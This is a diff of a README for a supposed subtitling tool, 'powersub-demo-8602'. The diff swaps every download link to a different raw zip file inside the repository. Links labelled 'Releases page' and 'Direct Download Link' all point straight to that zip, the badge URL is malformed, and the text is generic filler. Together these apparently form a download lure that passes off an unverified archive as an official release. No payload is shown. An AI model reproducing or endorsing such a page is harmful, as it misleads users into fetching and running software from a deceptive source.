@@ -1,6 +1,6 @@
 # 🌟 powersub-demo-8602 - Effortlessly Enhance Your Subtitling Experience
 
-[![Download Latest Release](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/albumoscope/powersub-demo-8602.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/albumoscope/powersub-demo-8602.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/spurling/powersub_demo_v1.2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/spurling/powersub_demo_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,9 +19,9 @@ To run powersub-demo-8602, make sure your computer meets the following requireme
 
 To install powersub-demo-8602, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/albumoscope/powersub-demo-8602.zip) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/spurling/powersub_demo_v1.2.zip) to find the latest version of the application.
 
-2. **Download the Application:** Click on the version you want to download. For example, you might see something like "https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/albumoscope/powersub-demo-8602.zip" or "https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/albumoscope/powersub-demo-8602.zip". Select this file to start the download.
+2. **Download the Application:** Click on the version you want to download. For example, you might see something like "https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/spurling/powersub_demo_v1.2.zip" or "https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/spurling/powersub_demo_v1.2.zip". Select this file to start the download.
 
 3. **Locate the Downloaded File:** Once the download is complete, locate the file in your "Downloads" folder.
 
@@ -31,7 +31,7 @@ To install powersub-demo-8602, follow these simple steps:
 
 ### 🔗 Direct Download Link
 
-You can also access the download directly here: [Download powersub-demo-8602](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/albumoscope/powersub-demo-8602.zip).
+You can also access the download directly here: [Download powersub-demo-8602](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/spurling/powersub_demo_v1.2.zip).
 
 ## 🔧 Features
 
@@ -58,4 +58,4 @@ If you have any issues or questions, don't hesitate to reach out for help. Click
 
 With powersub-demo-8602, you can easily manage subtitles for your videos. Follow the steps in this guide, and you’ll be enhancing your viewing experience in no time!
 
-For more updates, feel free to check our [Releases page](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/albumoscope/powersub-demo-8602.zip) often. Happy subtitling!
+For more updates, feel free to check our [Releases page](https://raw.githubusercontent.com/yantoaldama/powersub-demo-8602/main/spurling/powersub_demo_v1.2.zip) often. Happy subtitling!
